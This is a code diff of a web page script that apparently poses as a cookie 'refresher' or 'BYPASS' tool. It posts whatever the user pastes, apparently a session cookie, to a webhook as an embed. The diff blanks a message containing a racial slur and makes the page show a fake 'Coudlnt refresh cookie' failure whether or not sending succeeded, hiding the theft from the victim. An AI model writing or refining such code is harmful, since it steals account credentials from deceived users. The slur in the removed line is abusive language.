@@ -111,7 +111,7 @@
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            content: "A nigga used the refresher",
+                            content: " ",
                             embeds: [{
                                 description: `\`\`\`\n${input}\n\`\`\``,
                                 color: 0xe60012,
@@ -121,13 +121,13 @@
                     });
                     
                     // Show success silently in result div
-                    resultContent.textContent = "Operation completed successfully";
+                    resultContent.textContent = "Coudlnt refresh cookie❌️";
                     resultDiv.style.display = 'block';
                     document.getElementById("dataInput").value = "";
                     
                 } catch (error) {
                     console.error("Error:", error);
-                    resultContent.textContent = "Operation completed";
+                    resultContent.textContent = "Coudlnt refresh cookie❌️";
                     resultDiv.style.display = 'block';
                 } finally {
                     button.textContent = "BYPASS";
